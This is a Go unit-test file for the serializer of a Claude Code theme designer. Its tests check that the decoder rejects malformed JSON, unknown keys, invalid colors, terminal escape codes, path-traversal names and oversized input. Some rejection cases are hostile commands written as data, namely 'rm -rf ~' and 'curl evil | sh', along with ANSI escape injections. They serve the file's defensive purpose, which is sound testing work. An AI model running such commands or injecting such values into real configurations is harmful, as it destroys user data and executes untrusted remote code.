package serialize

import (
	"bytes"
	"errors"
	"strings"
	"testing"

	"github.com/aleslanger/claude-code-theme-designer/internal/theme"
)

func mustDecode(t *testing.T, s string) theme.Theme {
	t.Helper()
	th, err := Decode([]byte(s))
	if err != nil {
		t.Fatalf("Decode: %v", err)
	}
	return th
}

func wantReject(t *testing.T, s, fragment string) {
	t.Helper()
	_, err := Decode([]byte(s))
	var de *DecodeError
	if !errors.As(err, &de) {
		t.Fatalf("Decode(%q) = %v, want DecodeError", s, err)
	}
	if !strings.Contains(err.Error(), fragment) {
		t.Fatalf("error %q does not mention %q", err, fragment)
	}
}

func TestDecodeDocumentedExample(t *testing.T) {
	th := mustDecode(t, `{"name":"Dracula","base":"dark","overrides":{"claude":"#bd93f9","error":"#ff5555","success":"#50fa7b"}}`)
	if th.Name != "Dracula" || th.Base != theme.BaseDark || len(th.Overrides) != 3 {
		t.Fatalf("unexpected theme %+v", th)
	}
}

func TestDecodeAllFieldsOptional(t *testing.T) {
	th := mustDecode(t, `{}`)
	if th.Name != "" || th.Base != "" || len(th.Overrides) != 0 {
		t.Fatalf("expected empty theme, got %+v", th)
	}
}

func TestDecodeRejectsMalformedInput(t *testing.T) {
	cases := map[string]string{
		`[]`:                        "top level must be a JSON object",
		`"x"`:                       "top level must be a JSON object",
		`{`:                         "malformed JSON",
		`{"name":"a"} {"name":"b"}`: "unexpected data after",
		`{"name":"a","name":"b"}`:   "duplicate key",
		`{"overrides":{"text":"#fff","text":"#000"}}`: "duplicate key",
		`{"hooks":{"run":"rm -rf ~"}}`:                "unknown top-level key",
		`{"command":"curl evil | sh"}`:                "unknown top-level key",
		`{"name":42}`:                                 "must be a string",
		`{"name":""}`:                                 "must not be empty",
		`{"name":"x\u001b[2J"}`:                       "control",
		`{"base":"solarized"}`:                        "unknown base",
		`{"overrides":[]}`:                            "must be a JSON object",
		`{"overrides":{"text":123}}`:                  "must be a string",
		`{"overrides":{"text":{"a":1}}}`:              "must be a string",
		`{"overrides":{"text":"blue"}}`:               "invalid color",
		`{"overrides":{"text":"\u001b[31m"}}`:         "invalid color",
		`{"overrides":{"../x":"#fff"}}`:               "invalid token name",
		`{"overrides":{"a b":"#fff"}}`:                "invalid token name",
	}
	for in, frag := range cases {
		t.Run(in, func(t *testing.T) { wantReject(t, in, frag) })
	}
}

func TestDecodeRejectsEncodingAttacks(t *testing.T) {
	wantReject(t, "\xef\xbb\xbf{}", "byte order mark")
	wantReject(t, "{\"name\":\"\xff\"}", "UTF-8")
	big := `{"name":"` + strings.Repeat("a", MaxFileSize) + `"}`
	wantReject(t, big, "larger than")
}

func TestDecodeRejectsTooManyOverrides(t *testing.T) {
	var b strings.Builder
	b.WriteString(`{"overrides":{`)
	for i := 0; i <= MaxOverrides; i++ {
		if i > 0 {
			b.WriteString(",")
		}
		b.WriteString(`"t` + strings.Repeat("x", i%10) + string(rune('a'+i%26)) + itoa(i) + `":"#fff"`)
	}
	b.WriteString(`}}`)
	wantReject(t, b.String(), "more than")
}

func itoa(i int) string {
	const digits = "0123456789"
	if i < 10 {
		return digits[i : i+1]
	}
	return itoa(i/10) + digits[i%10:i%10+1]
}

func TestDecodeReportsProblemsWithoutEchoingControlCharacters(t *testing.T) {
	_, err := Decode([]byte(`{"evil\u001b]0;x\u0007":1}`))
	if err == nil || strings.ContainsAny(err.Error(), "\x1b\x07") {
		t.Fatalf("problem text must be sanitized, got %q", err)
	}
}

func TestDecodePreservesUnknownOverrideKeys(t *testing.T) {
	th := mustDecode(t, `{"overrides":{"tokenFromTheFuture":"#123456"}}`)
	if c, ok := th.Override("tokenFromTheFuture"); !ok || c.String() != "#123456" {
		t.Fatalf("unknown key not preserved: %+v", th)
	}
}

func TestEncodeIsDeterministicAndMatchesClaudeShape(t *testing.T) {
	th := theme.Theme{Name: "Prompt Contrast", Base: theme.BaseDark, Overrides: map[string]theme.Color{
		"userMessageBackground": theme.MustParseColor("#332b4f"),
		"briefLabelYou":         theme.MustParseColor("#c4a7ff"),
	}}
	got, err := Encode(th)
	if err != nil {
		t.Fatal(err)
	}
	want := "{\n  \"name\": \"Prompt Contrast\",\n  \"base\": \"dark\",\n  \"overrides\": {\n" +
		"    \"briefLabelYou\": \"#c4a7ff\",\n    \"userMessageBackground\": \"#332b4f\"\n  }\n}\n"
	if string(got) != want {
		t.Fatalf("Encode =\n%s\nwant\n%s", got, want)
	}
}

func TestEncodeOmitsAbsentFields(t *testing.T) {
	got, err := Encode(theme.Theme{})
	if err != nil {
		t.Fatal(err)
	}
	if string(got) != "{\n  \"overrides\": {}\n}\n" {
		t.Fatalf("unexpected %q", got)
	}
}

func TestEncodeRefusesInvalidThemes(t *testing.T) {
	bad := []theme.Theme{
		{Name: "x\x1b[31m"},
		{Base: "nope"},
		{Overrides: map[string]theme.Color{"../evil": theme.MustParseColor("#fff")}},
		{Overrides: map[string]theme.Color{"text": {}}},
	}
	for _, th := range bad {
		if _, err := Encode(th); err == nil {
			t.Errorf("Encode(%+v) succeeded, want error", th)
		}
	}
}

func TestRoundTripPreservesValuesAndInheritance(t *testing.T) {
	in := `{
  "base": "light",
  "overrides": {
    "briefLabelYou": "ansi:blueBright",
    "futureToken": "#abc",
    "text": "rgb(10, 20, 30)",
    "userMessageBackground": "ansi256(236)"
  }
}
`
	th := mustDecode(t, in)
	if th.Name != "" {
		t.Fatal("absent name must stay absent")
	}
	if _, ok := th.Override("claude"); ok {
		t.Fatal("inherited token must stay inherited")
	}
	out, err := Encode(th)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(out, []byte(in)) {
		t.Fatalf("round trip changed the document:\n%s", out)
	}
	again := mustDecode(t, string(out))
	if !again.Equal(th) {
		t.Fatal("decode(encode(t)) != t")
	}
}
